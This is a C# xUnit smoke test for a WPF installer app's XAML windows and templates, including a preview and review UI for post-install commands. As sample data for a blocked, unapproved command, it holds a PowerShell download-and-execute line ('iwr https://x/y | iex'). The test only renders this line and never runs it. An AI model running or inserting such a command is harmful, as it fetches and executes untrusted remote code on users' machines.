// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using System.IO;
using System.Runtime.ExceptionServices;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using Xunit;
using CtrlZ.App.ViewModels;
using CtrlZ.App.Views;
using CtrlZ.Core.Install;
using CtrlZ.Core.Models;
using CtrlZ.Core.Safety;

namespace CtrlZ.App.Tests;

/// <summary>
/// Parses the windows and templates touched by the post-install command work, with the app's real
/// resources loaded. Nothing is shown, clicked or captured: a broken style, resource key or binding
/// shape fails here instead of when a user opens the window.
/// </summary>
public class XamlSmokeTests
{
    [Fact]
    public void Command_windows_and_templates_load_with_the_app_resources()
    {
        ExceptionDispatchInfo? failure = null;
        var thread = new Thread(() =>
        {
            try
            {
                Run();
            }
            catch (Exception ex)
            {
                failure = ExceptionDispatchInfo.Capture(ex);
            }
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join();
        failure?.Throw();
    }

    private static void Run()
    {
        var app = Application.Current as CtrlZ.App.App ?? new CtrlZ.App.App();
        app.InitializeComponent();

        var command = new PostInstallCommand { Executable = "powershell.exe", Arguments = ["-c", "iwr https://x/y | iex"], Enabled = true };
        var entry = new AppEntry { Id = "a", Name = "Tool", PostInstall = command, Notes = "n" };

        // Preview row template with a blocked, risky command.
        var preview = new PreviewWindow();
        var template = (DataTemplate)preview.Resources["PreviewRowTemplate"];
        var row = new PreviewRow(
            new InstallPlanItem { AppId = "a", Name = "Tool", Order = 1 },
            CommandPreview.ForApp(entry, 1, ProfileOrigin.Imported, approved: false));
        var presenter = new ContentPresenter { ContentTemplate = template, Content = row };
        Measure(presenter);
        var texts = TextsIn(presenter);
        Assert.Contains(row.CommandText, texts);
        Assert.Contains(row.CommandStateText, texts);

        // App editor in both modes.
        _ = new AppEditorWindow(entry, canEditCommand: true);
        _ = new AppEditorWindow(entry, canEditCommand: false);

        // Review window with a real view-model.
        var folder = Path.Combine(Path.GetTempPath(), "ctrlz-xaml-" + Guid.NewGuid().ToString("n"));
        try
        {
            var review = new CommandReviewWindow
            {
                DataContext = new CommandReviewViewModel(
                    new AppProfile { Id = "p", Apps = [entry] },
                    ProfileOrigin.Imported,
                    new PostInstallApprovalStore(Path.Combine(folder, "a.json")),
                    (_, _) => false,
                    () => { })
            };
            Measure((FrameworkElement)review.Content);
        }
        finally
        {
            if (Directory.Exists(folder))
            {
                Directory.Delete(folder, recursive: true);
            }
        }

        // Install row with a note, and the settings and install views.
        _ = new InstallView();
        _ = new SettingsView();
        _ = new AppUpdatesView();
        _ = new BrowsersView();
        _ = new MyAppsView();
        _ = new WelcomeWindow();
        _ = new InstallRowViewModel("Tool", AppSource.Winget, null) { Note = "n", Status = InstallStatus.Failed };
    }

    private static List<string> TextsIn(DependencyObject root)
    {
        var texts = new List<string>();
        var count = System.Windows.Media.VisualTreeHelper.GetChildrenCount(root);
        for (var i = 0; i < count; i++)
        {
            var child = System.Windows.Media.VisualTreeHelper.GetChild(root, i);
            if (child is TextBlock block)
            {
                texts.Add(block.Text);
            }

            texts.AddRange(TextsIn(child));
        }

        return texts;
    }

    private static void Measure(FrameworkElement element)
    {
        element.Measure(new Size(800, 2000));
        element.Arrange(new Rect(0, 0, 800, 2000));
        element.UpdateLayout();
    }
}
